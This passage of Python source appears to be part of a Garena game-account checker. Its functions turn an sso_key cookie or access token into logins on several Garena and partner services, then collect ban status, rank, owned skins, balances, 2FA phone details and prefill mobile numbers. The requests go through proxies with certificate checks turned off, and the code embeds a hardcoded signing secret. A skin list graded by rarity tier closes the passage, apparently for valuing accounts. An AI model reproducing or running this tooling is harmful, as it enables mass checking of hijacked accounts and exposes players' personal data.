                    'expiredAt': player.get('expiredAt'),
                    'banTime': player.get('banTime'),
                }
            ]
            return {
                'level': player.get('level', 0),
                'register_time': reg_str,
                'banned': 'YES' if _is_banned_info(ban_payload) else 'NO',
                'credit_score': rep,
                '_raw_player': player,
            }
    except Exception:
        return {}
    return {}

def _fetch_weekly_profile(access_token, proxy=None):
    if not requests or not access_token:
        return {}
    try:
        ua = "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
        headers = {'Access-Token': access_token, 'Partition': '1011', 'User-Agent': ua}
        resp = requests.get("https://weeklyreport.moba.garena.vn/api/profile",
                             headers=headers, verify=False, timeout=5,
                             proxies=_get_http_proxies(proxy))
        if resp.status_code == 200:
            data = resp.json()
            pi = data.get('player_info', {})
            rank_cfg = data.get('rank_config', {})
            rid = pi.get('rank')
            rank_name = ''
            stars = 0
            if rid is not None and str(rid) in rank_cfg:
                rank_entry = rank_cfg[str(rid)] or {}
                rank_name = rank_entry.get('name', '')
                for field in ('stars', 'star', 'level', 'sub_rank', 'tier_level', 'sub_level', 'division', 'star_count'):
                    v = rank_entry.get(field)
                    if v is not None:
                        try:
                            n = int(v)
                            if 1 <= n <= 50:
                                stars = n
                                break
                        except (ValueError, TypeError):
                            pass
            return {
                'name': pi.get('name', ''),
                'rank': rank_name or (str(rid) if rid else ''),
                'rank_id': rid,
                'rank_stars': stars,
                'rank_entry': rank_cfg.get(str(rid)) if rid else {},
            }
    except Exception:
        pass
    return {}

def _fetch_sale_skins(redirect_url, proxy=None):
    if not requests or not redirect_url:
        return {}
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect_url, allow_redirects=False, verify=False, timeout=6)
        if not sess.cookies:
            return {}
        gql = {
            "operationName": "getUser",
            "variables": {},
            "query": "query getUser { getUser { id name profile { ownedItemIdList cp } } }"
        }
        resp = sess.post("https://sale.lienquan.garena.vn/graphql", json=gql, verify=False, timeout=6)
        result = {}
        if resp.status_code == 200:
            user = (resp.json().get('data') or {}).get('getUser')
            if user:
                profile = user.get('profile') or {}
                owned = profile.get('ownedItemIdList') or []
                result = _classify_skins(owned)
                result['cp'] = profile.get('cp', 0)
        return result
    except Exception:
        return {}

def _get_app_redirect_url(sock, session_key, redirect_uri):
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, redirect_uri) +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return ''
        fields = _proto_decode(resp)
        url = fields.get(2, b'')
        return url.decode('utf-8') if isinstance(url, bytes) else str(url)
    except Exception:
        return ''

def _fetch_rov_th_via_termgame(sso_key, proxy=None):
    if not requests or not sso_key:
        return {}
    try:
        from urllib.parse import quote_plus as _qp
        base_url = "https://termgame.com/"
        sess = requests.Session(); sess.verify = False
        if proxy: sess.proxies = _get_http_proxies(proxy)
        sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'})
        redir = _qp(f'{base_url}app/')
        payload = (f'client_id=10017&response_type=token'
                   f'&redirect_uri={redir}&format=json&id={int(time.time())}')
        r = sess.post('https://authgop.garena.com/oauth/token/grant',
            data=payload, timeout=8,
            headers={'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                     'cookie': f'sso_key={sso_key}'})
        if r.status_code != 200: return {}
        access_token = (r.json() or {}).get('access_token', '')
        if not access_token: return {}
        r = sess.post(f'{base_url}api/auth/inspect_token',
            json={'token': access_token}, timeout=8,
            headers={'accept': 'application/json', 'content-type': 'application/json'})
        if r.status_code != 200: return {}
        inspect = r.json() or {}
        set_cookie = r.headers.get('Set-Cookie', '') or ''
        tg_session = ''
        if 'session_key=' in set_cookie:
            tg_session = set_cookie.split('session_key=', 1)[1].split(';', 1)[0]
        if not tg_session: return {}
        tvs = inspect.get('two_step_verify_status') or {}
        out = {
            'shells': int(inspect.get('shell_balance', 0) or 0),
            'uac': inspect.get('uac', '') or '',
            'tg_username': inspect.get('username', '') or '',
            '_shop_source': base_url,
            'tg_display_mobile': tvs.get('display_mobile_no', '') or '',
            'tg_2fa_bind_time': int(tvs.get('bind_time', 0) or 0),
            'tg_is_verified': bool(inspect.get('is_garena_verified')),
        }
        hdr = {'accept': 'application/json, text/plain, */*',
               'cookie': f'source=pc; session_key={tg_session}'}
        try:
            rr = sess.get(f'{base_url}api/shop/apps/roles?app_id=100055&region=IN.TH&language=th&source=pc',
                timeout=8, headers=hdr)
            if rr.status_code == 200:
                roles_list = (rr.json() or {}).get('100055') or []
                if roles_list:
                    role = roles_list[0]
                    out['rov_role_name']      = role.get('role', '') or ''
                    out['rov_role_id']        = int(role.get('role_id', 0) or 0)
                    out['rov_server']         = role.get('server', '') or ''
                    out['rov_server_id']      = int(role.get('server_id', 0) or 0)
                    out['rov_packed_role_id'] = int(role.get('packed_role_id', 0) or 0)
                    out['rov_open_id']        = role.get('open_id', '') or ''
                    out['has_rov_role']       = bool(out['rov_role_id'])
        except Exception:
            pass
        try:
            rr = sess.get(f'{base_url}api/shop/apps/roles?app_id=100054&language=vi&source=pc',
                timeout=8, headers=hdr)
            if rr.status_code == 200:
                aov_list = (rr.json() or {}).get('100054') or []
                if aov_list:
                    aov_role = aov_list[0]
                    out['aov_tg_name']   = aov_role.get('role', '') or ''
                    out['aov_server']    = aov_role.get('server', '') or ''
                    out['aov_server_id'] = int(aov_role.get('server_id', 0) or 0)
                    out['aov_open_id']   = aov_role.get('open_id', '') or ''
        except Exception:
            pass
        return out
    except Exception:
        return {}

def _fetch_fc_prefill_via_sso(sso_key, proxy=None):
    if not requests or not sso_key:
        return ""
    try:
        grant_post_data = f'client_id=100155&response_type=token&redirect_uri=gop100155%3A%2F%2F&login_scenario=normal&format=json&id={round(time.time() * 1000)}'
        grant_headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GarenaMSDK/5.12.0 (iPhone15,3;ios - 18.6;vi-JP;JP',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Origin': 'https://100155.connect.garena.com',
            'Referer': 'https://100155.connect.garena.com/universal/oauth?locale=vi_JP&platform=1&response_type=token&login_scenario=normal&client_id=100155&display=embedded&redirect_uri=gop100155%3A%2F%2F',
            'Cookie': f'sso_key={sso_key}'
        }
        grant_url = 'https://100155.connect.garena.com/oauth/token/grant'
        grant_response = requests.post(grant_url, data=grant_post_data, headers=grant_headers, timeout=7, verify=False, proxies=_get_http_proxies(proxy))
        access_token = grant_response.json().get('access_token', '')
        if not access_token:
            return ""
        headers2 = {
            'User-Agent': 'GarenaMSDK/5.12.1(SM-S908N ;Android 9;vi;vn;)',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'If-Modified-Since': 'Thu, 05 Mar 2026 02:22:02 GMT',
        }
        response = requests.get(
            f'https://100155.connect.garena.com/api/v1/game/local-requirement/user-info?app_id=100155&region=VN&access_token={access_token}',
            headers=headers2,
            timeout=7,
            verify=False,
            proxies=_get_http_proxies(proxy)
        )
        return response.json().get('data', {}).get('prefill_mobile', '')
    except Exception:
        pass
    return ""

def _fetch_fcmobile_me_from_access_token(access_token, proxy=None):
    if not requests or not access_token:
        return {}
    hosts = ["liendoan.fcmobile.garena.vn", "hiepphu3.fcmobile.garena.vn"]
    paths = ["/api/app/me", "/api/me", "/api/user/me", "/api/v1/app/me"]
    for h in hosts:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        base = f"https://{h}"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"{base}/",
        }
        try:
            resp = sess.get(
                base + "/connect/garena/callback",
                params={"access_token": access_token, "source_type": "ingame"},
                headers=headers,
                verify=False,
                timeout=5,
                allow_redirects=True,
            )
            ss = sess.cookies.get("ss_fcm") or ""
            ff = sess.cookies.get("ff_session") or ""
            if not ss and not ff:
                continue
            for p in paths:
                me_resp = sess.get(base + p, headers=headers, verify=False, timeout=5)
                if me_resp.status_code == 200:
                    data = me_resp.json()
                    if isinstance(data, dict) and data.get('user'):
                        out = {"host": h, "ss_fcm": ss, "ff_session": ff, "user": data['user'], "path": p}
                        out["ovr"] = data['user'].get("ovr")
                        out["uid"] = data['user'].get("uid")
                        out["name"] = data['user'].get("name")
                        out["rankTCN"] = data['user'].get("rankTCN")
                        out["rankDDC"] = data['user'].get("rankDDC")
                        out["rankDGL"] = data['user'].get("rankDGL")
                        out["point"] = data['user'].get("Point")
                        return out
        except Exception:
            pass
    return {}

def _fetch_delta_force_info(sso_key, proxy=None):
    if not requests or not sso_key:
        return {}
    out = {}
    proxies = _get_http_proxies(proxy)
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    try:
        grant_data = (
            f'client_id={DF_GARENA_CLIENT_ID}&response_type=token'
            f'&redirect_uri=https%3A%2F%2Fcommon-web.intlgame.com%2Fjssdk%2Fgarenalogincallback.html'
            f'&format=json&id={int(time.time())}'
        )
        r = requests.post(
            'https://authgop.garena.com/oauth/token/grant',
            data=grant_data, timeout=8, verify=False,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'User-Agent': ua,
                'Cookie': f'sso_key={sso_key}',
            },
            proxies=proxies,
        )
        if r.status_code != 200:
            return out
        garena = r.json() or {}
        garena_token = garena.get('access_token', '')
        garena_openid = garena.get('open_id', '') or str(garena.get('uid', ''))
        if not garena_token:
            return out
        out['df_garena_token'] = True
        ts_ms = str(int(time.time() * 1000))
        intl_body = {
            "device_info": {
                "guest_id": str(uuid.uuid4()),
                "lang_type": "en",
                "app_version": "0.0",
                "screen_height": 864, "screen_width": 1536,
                "device_brand": "Google Inc.",
                "device_model": ua,
                "network_type": "4g",
                "ram_total": 8, "rom_total": 8,
                "cpu_name": "Win32",
                "android_imei": "", "ios_idfa": "",
                "page": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "page_with_search": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "ts": int(ts_ms),
            },
            "channel_dis": "00000000",
            "channel_info": {
                "thirdType": "garena",
                "token": garena_token,
                "openId": garena_openid,
            },
        }
        intl_params = (
            f'channelid=10&conn=0&gameid=30150&os=5'
            f'&sdk_version=1.22.1&seq=&source=32&ts={ts_ms}'
        )
        intl_r = requests.post(
            f'https://intlsdk-new.iegg.garena.com/v2/auth/login?{intl_params}',
            json=intl_body, timeout=10, verify=False,
            headers={'Content-Type': 'application/json', 'User-Agent': ua},
            proxies=proxies,
        )
        intl_data = intl_r.json() if intl_r.status_code == 200 else {}
        intl_token = intl_data.get('token', '')
        intl_openid = intl_data.get('openid', '')
        if not intl_token:
            out['df_intl_error'] = intl_data.get('msg', 'no token')
            return out
        out['df_intl_ok'] = True

        # CMS Login
        import hashlib
        def _df_sign_url(path):
            u = str(uuid.uuid4())
            ts = str(int(time.time()))
            qs = f"u={u}&a=10005&ts={ts}"
            full = f"{path}?{qs}"
            sig = hashlib.md5(f"/{full}&appkey=intel#!2022$act".encode()).hexdigest()
            return f"{full}&s={sig}"
        cms_path = _df_sign_url('api/gpts.auth_svr.AuthSvr/LoginByINTL')
        cms_body = {
            "mappid": 10109,
            "clienttype": 903,
            "login_info": {
                "channel_id": 10,
                "token": intl_token,
                "open_id": intl_openid,
                "channelid": 10,
                "expires": str(intl_data.get('token_expire_time', '')),
                "game_id": "30150",
                "channel_info": "{}",
            },
        }
        cms_r = requests.post(
            f'https://sg-community.playerinfinite.com/{cms_path}',
            json=cms_body, timeout=10, verify=False,
            headers={'Content-Type': 'application/json', 'User-Agent': ua},
            proxies=proxies,
        )
        cms_data = cms_r.json() if cms_r.status_code == 200 else {}
        ticket = ''
        uid = ''
        if isinstance(cms_data.get('data'), dict):
            ticket = cms_data['data'].get('ticket', '')
            uid = str(cms_data['data'].get('uid', ''))
        if not ticket:
            out['df_cms_error'] = cms_data.get('msg', 'no ticket')
            return out
        out['df_ticket'] = True
        out['df_uid'] = uid

        # GetMyData
        def _df_sign_url(path, params=None):
            u = str(uuid.uuid4())
            ts = str(int(time.time()))
            qs = f"u={u}&a=10005&ts={ts}"
            if params:
                extra = "&".join(f"{k}={v}" for k, v in params.items())
                qs = extra + "&" + qs
            full = f"{path}?{qs}"
            sig = hashlib.md5(f"/{full}&appkey=intel#!2022$act".encode()).hexdigest()
            return f"{full}&s={sig}"
        api_path = _df_sign_url('api/proxy/logicial/DfTools/GetMyData')
        api_body = {"needLogin": True, "seasonno": [], "report_type": 1}
        api_r = requests.post(
            f'https://sg-act.playerinfinite.com/{api_path}',
            json=api_body, timeout=10, verify=False,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': ua,
                'X-Ticket': ticket,
                'X-uid': uid,
                'x-gameid': '29158',
                'x-source': 'pc_web',
                'x-language': 'vi',
                'Origin': 'https://www.playdeltaforce.com',
                'Referer': 'https://www.playdeltaforce.com/',
            },
            proxies=proxies,
        )
        api_data = api_r.json() if api_r.status_code == 200 else {}
        if api_data.get('code') == 0 and isinstance(api_data.get('data'), dict):
            d = api_data['data']
            out['df_has_data'] = True
            out['df_nickname'] = d.get('nickname', '') or d.get('name', '')
            out['df_level'] = d.get('level', 0) or d.get('lv', 0)
            out['df_uid_game'] = d.get('uid', '') or uid
            out['df_avatar'] = d.get('avatar', '')
            out['df_raw'] = d
            seasons = d.get('season_data') or d.get('seasons') or []
            if isinstance(seasons, list) and seasons:
                latest = seasons[0] if isinstance(seasons[0], dict) else {}
                out['df_rank'] = latest.get('rank_name', '') or latest.get('rank', '')
                out['df_season'] = latest.get('season_name', '') or latest.get('seasonno', '')
                out['df_matches'] = latest.get('total_match', 0) or latest.get('matches', 0)
                out['df_wins'] = latest.get('win_match', 0) or latest.get('wins', 0)
                out['df_kd'] = latest.get('kd', '') or latest.get('kd_ratio', '')
        else:
            out['df_api_error'] = api_data.get('msg', 'no data')
            out['df_api_code'] = api_data.get('code', -1)
        return out
    except Exception:
        return out

def _fetch_fc_mobile_vn_user_info(access_token, region="VN", proxy=None):
    if not requests or not access_token:
        return {}
    try:
        params = {"app_id": str(FC_MOBILE_VN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params,
            verify=False,
            timeout=5,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

# ======================= SKIN DATABASE =====================================
RAW_SKIN_DATA = """
========== SSS (30) ==========
10620: Krixi Phù thủy thời không (Krixi)
11107: Violet Thứ nguyên vệ thần (Violet)
11119: Violet Vọng nguyệt Long Cơ (Violet)
11607: Butterfly Phượng Cửu Thiên (Butterfly)
12912: Triệu Vân Minh Chung Long Đế (Triệu Vân)
13011: Airi Bích hải thánh nữ (Airi)
13015: Airi Thứ nguyên Vệ thần (Airi)
13116: Murad Tuyệt thế thần binh (Murad)
13118: Murad Thiên Luân Kiếm Thánh (Murad)
13210: Hayate Tu Di Thánh Đế (Hayate)
13314: Valhein Thứ nguyên vệ thần (Valhein)
13613: Ilumia Lưỡng Nghi Long Hậu (Ilumia)
14111: Lauriel Thứ nguyên vệ thần (Lauriel)
15009: Nakroth thứ nguyên vệ thần (Nakroth)
15013: Nakroth Quỷ thương Liệp Đế (Nakroth)
15015: Nakroth Bạch diện chiến thương (Nakroth)
15217: Điêu Thuyền Nhật Nguyệt Thánh Linh (Điêu Thuyền)
15412: Yena Huyền cửu thiên (Yena)
15710: Raz Bão vũ Cuồng lôi (Raz)
19007: Tulen Chí tôn kiếm tiên (Tulen)
19009: Tulen Thần sứ ST.L-79 (Tulen)
19908: Eland'orr Mộng giới thần chủ (Eland'orr)
50105: Tel'Annas Thần sứ F.E.E-X1 (Tel'Annas)
50108: Tel'Annas Thứ nguyên vệ thần (Tel'Annas)
50112: Tel'Annas Tân niên vệ thần (Tel'Annas)
50119: Tel'Annas Lân Quang Thánh Điệu (Tel'Annas)
52011: Veres Lưu ly Long mẫu (Veres)
52414: Capheny Càn Nguyên Điện Chủ (Capheny)
54307: Aya Công chúa cầu vồng (Aya)
54804: Bijan Kình thiên Long Kỵ (Bijan)

========== SS (109) ==========
10603: Krixi Tiệc Bãi Biển (Krixi)
10705: Zephys Siêu việt (Zephys)
10714: Zephys Kỷ Nguyên Hổ Phách (Zephys)
10801: Gildur Tiệc Bãi Biển (Gildur)
10912: Veera A.I Love you (Veera)
10915: Veera Thất Sát - Thượng Sinh (Veera)
11105: Violet Tiệc bãi biển (Violet)
11110: Violet Vợ người ta (Violet)
11113: Violet Huyết ma thần (Violet)
11115: Violet Thần long tỷ tỷ (Violet)
11202: Yorn Thế Tử Nguyệt Tộc (Yorn)
11205: Yorn Long thần soái (Yorn)
11212: Yorn Vệ Binh ngân hà (Yorn)
11604: Butterfly Nữ Quái Nổi Loạn (Butterfly)
11610: Butterfly Asuna Tia chớp (Butterfly)
11614: Butterfly Kim ngư thần nữ (Butterfly)
11616: Butterfly Thánh nữ khởi nguyên (Butterfly)
11619: Butterfly Rockgirl Siêu Đẳng (Butterfly)
11808: Alice Quân nhạc Athanor (Alice)
12008: Mina Linh Xà yêu vũ (Mina)
12304: Maloch Đại Tướng Robot (Maloch)
12606: Arduin Bạch vệ chiến giáp (Arduin)
12608: Arduin Ngạo Hổ Hàn Đao (Arduin)
12801: Lữ Bố Tiệc Bãi Biển (Lữ Bố)
12806: Lữ Bố Tư lệnh Robot (Lữ Bố)
12812: Lữ Bố Cửu Thiên Lôi Thần (Lữ Bố)
12907: Triệu Vân Kỵ sĩ tận thế (Triệu Vân)
13005: Airi Kiemono (Airi)
13006: Airi Bạch Kiemono (Airi)
13104: Murad Siêu việt (Murad)
13108: Murad Siêu việt 2.0 (Murad)
13109: Murad Chí tôn thần kiếm (Murad)
13204: Hayate Tử thần vũ trụ (Hayate)
13212: Hayate Thống soái Dạ Ưng (Hayate)
13302: Valhein Vũ khí tối thượng (Valhein)
13313: Valhein Đệ nhất thần thám (Valhein)
13316: Valhein Mã Hành Vạn Lý (Valhein)
13609: Ilumia Khải Huyền Thiên Hậu (Ilumia)
13612: Ilumia Nộ hải Thiên ngư (Ilumia)
13705: Paine Tử xà Bá tước (Paine)
14104: Lauriel Thánh quang sứ (Lauriel)
14107: Lauriel Tinh vân sứ (Lauriel)
14109: Lauriel thiên sứ công nghệ (Lauriel)
14110: Lauriel Phi thiên (Lauriel)
14117: Lauriel Vũ khúc miêu ảnh (Lauriel)
14118: Lauriel Thiên nữ Dạ Ưng (Lauriel)
14120: Lauriel Mã Đằng Cửu Thế (Lauriel)
14206: Natalya Nghiệp hỏa yêu hậu (Natalya)
14213: Natalya Nguyệt Ảnh Kiếm Tiên (Natalya)
14404: Taara Tiệc bãi biển (Taara)
15007: Nakroth Lôi Quang Sứ (Nakroth)
15202: Điêu Thuyền Tiệc bãi biển (Điêu Thuyền)
15211: Điêu Thuyền Thất Tịch Tiên Tử (Điêu Thuyền)
15216: Điêu Thuyền Tuế Hàn Đỗ Quyên (Điêu Thuyền)
15413: Yena Trấn Yêu Thần Lộc (Yena)
15611: Aleister HLV bất bại (Aleister)
15704: Raz Chiến thần Muay Thái (Raz)
15705: Raz Siêu việt (Raz)
15905: Dolia Mã Khởi Thiên Ca (Dolia)
16304: Ryoma Samurai Huyền thoại (Ryoma)
16607: Arthur Siêu Việt (Arthur)
16703: Ngộ Không Siêu việt (Ngộ Không)
16705: Ngộ Không Siêu việt 2.0 (Ngộ Không)
16710: Ngộ Không Tân niên Võ Thần (Ngộ Không)
16711: Ngộ Không Thần Giáp Xích Diễm (Ngộ Không)
16712: Ngộ Không Tề Thiên Võ Thánh (Ngộ Không)
17106: Cresht Bách tướng Lão tam (Cresht)
17309: Fennik Phong Tranh Thám Xuân (Fennik)
17408: Stuart Siêu trùm phản diện (Stuart)
18408: Helen Bé Hoa Xuân (Helen)
18702: Arum Vũ khúc long hổ (Arum)
18704: Arum Vũ khúc thần sứ (Arum)
19002: Tulen Tân Thần Thiên Hà (Tulen)
19006: Tulen Tân thần hoàng kim (Tulen)
19012: Tulen Tân niên vệ thần (Tulen)
19013: Tulen Tiêu Dao Vũ Thần (Tulen)
19109: Rouie Linh Sứ Thời không (Rouie)
19509: Enzo Sát thần Bạch Hổ (Enzo)
19605: Elsu Sứ giả tận thế (Elsu)
19609: Elsu Trấn thiên phi hồ (Elsu)
50111: Tel'Annas Vũ khúc yêu hồ (Tel'Annas)
50117: Tel'Annas Thiên Vũ Thần Long (Tel'Annas)
50604: Omen Đao phủ tận thế (Omen)
50613: Omen Liệt Hỏa Thiên Cang (Omen)
51003: Liliana Nguyệt mị ly (Liliana)
51004: Liliana Tiểu thơ anh đào (Liliana)
51005: Liliana Tân nguyệt mị ly (Liliana)
51013: Liliana Lưu Thủy Thần Long (Liliana)
51208: Rourke Bách tướng Lão đại (Rourke)
51306: Zata Chí tôn Tà Phượng (Zata)
51504: Richter Kiếm thần Susanoo (Richter)
51802: Quillen Đặc công mãng xà (Quillen)
51808: Quillen Nghịch thiên long đế (Quillen)
52007: Veres Kimono (Veres)
52113: Florentino Kỷ Nguyên Hổ Phách (Florentino)
52404: Capheny Kimono (Capheny)
52709: Sephera Bách nhạn ngân linh (Sephera)
53304: Laville Xạ Thần Tinh Vệ (Laville)
53309: Laville Vệ binh giáng sinh (Laville)
53701: Allain Kirito Hắc kiếm sĩ (Allain)
53702: Allain Kirito (Allain)
53703: Allain Tuyết sơn song kiếm (Allain)
54507: Yue Hỗn Độn Thần Ma (Yue)
54802: Bijan Hoàng kim cơ giáp (Bijan)
54805: Bijan Lữ Hành Thời Không (Bijan)
56703: Erin Tình yêu cổ tích (Erin)
56704: Erin Huyễn Ảnh Mị Điệp (Erin)
59802: Bolt Baron Thiên Phủ - Tư Mệnh (Bolt Baron)
59901: Billow Thiên Tướng - Độ Ách (Billow)

========== Anime (48) ==========
10611: Krixi Terrible Tornado (Krixi)
10709: Zephys Inosuke Hashibira (Zephys)
10916: Veera My Melody‘s Love (Veera)
11120: Violet Nobara Kugisaki (Violet)
11215: Yorn Conan Edogawa (Yorn)
11611: Butterfly Stacia (Butterfly)
11621: Butterfly Ninh Tần (Butterfly)
11810: Alice Butterfly Mansion Girl (Alice)
11812: Alice - Eternal Sailor Chibi Moon (Alice)
12107: Marja Hi Phi (Marja)
12808: Lữ Bố Ichigo Kurosaki (Lữ Bố)
13111: Murad Byakuya Kuchiki (Murad)
13112: Murad Zenitsu Agatsuma (Murad)
13213: Hayate Siêu đạo chích Kid (Hayate)
13706: Paine Megumi Fushiguro (Paine)
14214: Natalya Kuromi's Heart (Natalya)
14412: Taara Shion (Taara)
15012: Nakroth Killua (Nakroth)
15212: Eternal Sailor Moon (Điêu Thuyền)
15707: Raz Saitama Cosplay (Raz)
15711: Raz Gon (Raz)
16307: Ryoma Ultraman (Ryoma)
16310: Ryoma Ailing Samurai (Ryoma)
16311: Ryoma Maple Frost (Ryoma)
16612: Arthur Pompompurin‘s Oath (Arthur)
16909: Slimz "Siêu Cấp Tối Thượng" (Slimz)
17706: Lindis Đồng phục Shihakusho (Lindis)
18906: Krizzix Cursed Corpse (Krizzix)
19015: Tulen Satoru Gojo (Tulen)
19506: Enzo Sát quỷ đoàn (Enzo)
19508: Enzo Kurapika (Enzo)
19906: Eland'orr-Tuxedo (Eland'orr)
20601: Charlotte Hexsword (Charlotte)
50118: Tel'Annas Jujutsu Sorcerer (Tel'Annas)
51907: Annette Nữ sinh trung học (Annette)
52105: Florentino SEVEN (Florentino)
52110: Florentino Hisoka (Florentino)
52204: Errol Genos (Errol)
52407: Capheny Harley Quinn (Capheny)
52415: Capheny Bugcag Assemble (Capheny)
52610: Ishar Capoo Boom (Ishar)
52809: Qi Milim Nava (Qi)
53107: Keera Nezuko Kamado (Keera)
53806: Iggy Rimuru Tempest (Iggy)
54002: Bright Toshiro Hitsugaya (Bright)
54309: Aya Cinnamoroll's Dream (Aya)
54402: Yan Tanjiro Kamado (Yan)
59702: Biron Yuji Itadori (Biron)

========== S (327) ==========
10502: Toro Trung Phong Cắm (Toro)
10506: Toro Tử Lôi Thần Ngưu (Toro)
10602: Krixi Xứ Sở Thần Tiên (Krixi)
10604: Krixi Cô Tiên Thỏ (Krixi)
10606: Krixi Tiểu yêu nữ (Krixi)
10607: Krixi Hồ Thiên Nga (Krixi)
10613: Krixi Nàng tiên nổi loạn (Krixi)
10703: Zephys Hiệp Sĩ Bí Ngô (Zephys)
10708: Zephys Hắc vô thường (Zephys)
10802: Gildur phượt thủ (Gildur)
10806: Gildur Bác học thiên tài (Gildur)
10807: Gildur Phù thủy Ba Tư (Gildur)
10809: Gildur Xích long (Gildur)
10902: Veera Góa phụ giả kim (Veera)
10904: Veera Y Tá Bạo Loạn (Veera)
10906: Veera Vũ hội Bóng đêm (Veera)
10907: Veera Kimono (Veera)
10910: Veera Đánh cắp trái tim (Veera)
11003: Kahlii Quàng Khăn Đỏ (Kahlii)
11004: Kahlii Kim cô giáo chủ (Kahlii)
11009: Kahlii Rối nước Thủy đình (Kahlii)
11103: Violet Phi Công Trẻ (Violet)
11109: Violet Đặc dị (Violet)
11114: Violet Lam Tước (Violet)
11116: Violet DJ câu hồn (Violet)
11203: Yorn Đặc Nhiệm Swat (Yorn)
11204: Yorn Phá Vân tiễn (Yorn)
11206: Yorn Nam thần Giáng sinh (Yorn)
11207: Yorn Soái ca học đường (Yorn)
11502: Jinna Dạ xoa vương (Jinna)
11503: Jinna Hỏa nhãn ma vương (Jinna)
11603: Butterfly Teen Nữ Công Nghệ (Butterfly)
11605: Butterfly Quận Chúa Đế Chế (Butterfly)
11608: Butterfly Cẩm y vệ: Chu Tước (Butterfly)
11613: Butterfly Gánh anh đến cùng (Butterfly)
11618: Butterfly Tình yêu nổi loạn (Butterfly)
11704: Ormarr Giáo Viên Thể Hình (Ormarr)
11802: Alice Phi hành gia (Alice)
11803: Alice Bé Gấu Tuyết (Alice)
11806: Alice Tiểu quỷ bí ngô (Alice)
11807: Alice bé du xuân (Alice)
11809: Alice Tiểu tiên tử (Alice)
11816: Alice Xứ sở diệu kỳ (Alice)
11902: Mganga Tiệc Bánh Kẹo (Mganga)
11903: Mganga Pháp sư mèo (Mganga)
11905: Mganga Độc toàn thân (Mganga)
12002: Mina Chị đại lắm chiêu (Mina)
12003: Mina Tiệc Bánh Kẹo (Mina)
12005: Mina Lưỡi hái hoàng kim (Mina)
12007: Mina Nữ thần Ai Cập (Mina)
12103: Marja Hỏa ngọc nữ vương (Marja)
12106: Marja Phù Quang Mạc Ảnh (Marja)
12301: Maloch Ác Ma Địa Ngục (Maloch)
12303: Maloch Samurai Tử Sĩ (Maloch)
12307: Maloch Vũ hội Bóng đêm (Maloch)
12309: Maloch Quỷ nhãn ma thể (Maloch)
12310: Maloch Đao phủ Dạ Ưng (Maloch)
12403: Ignis Bắc băng vương (Ignis)
12405: Ignis Thần mặt trời (Ignis)
12601: Arduin Cận Vệ Hoàng Gia (Arduin)
12603: Arduin Tà linh hiệp sỹ (Arduin)
12703: Azzen'ka Ghẹo hay kẹo (Azzen'Ka)
12704: Azzen'ka Quỷ diện lãng khách (Azzen'Ka)
12706: Azzen'Ka Giáng sinh "An lành" (Azzen'Ka)
12708: Azzen'Ka Tông đồ thần miếu (Azzen'Ka)
12802: Lữ Bố Nam Vương (Lữ Bố)
12805: Lữ Bố Đặc Nhiệm Swat (Lữ Bố)
12809: Lữ Bố Thần Ngọc (Lữ Bố)
12810: Lữ Bố Vũ điệu Samba (Lữ Bố)
12901: Triệu Vân Tiến sĩ thiên tài (Triệu Vân)
12902: Triệu Vân Đoạt mệnh thương (Triệu Vân)
12903: Triệu Vân Quý Công Tử (Triệu Vân)
12906: Triệu Vân Chiến tướng mùa đông (Triệu Vân)
12908: Triệu Vân Cẩm y vệ: Hỏa Long (Triệu Vân)
12910: Triệu Vân Thần Tài (Triệu Vân)
13001: Airi Thích Khách (Airi)
13004: Airi Cấm Vệ Nguyệt Tộc (Airi)
13008: Airi Tiệc bãi biển (Airi)
13010: Airi Đặc công tử điệp (Airi)
13013: Airi Thánh nữ Xiêm La (Airi)
13102: Murad M-TP Thần Tượng Học Đường (Murad)
13103: Murad Đồ thần đao (Murad)
13107: Murad Đặc dị (Murad)
13110: Murad Dược Sĩ Tình yêu (Murad)
13113: Murad Thích Khách Sa Mạc (Murad)
13115: Murad Huyết hỏa cuồng đồ (Murad)
13202: Hayate chiến binh trăng khuyết (Hayate)
13205: Hayate Quỷ diện (Hayate)
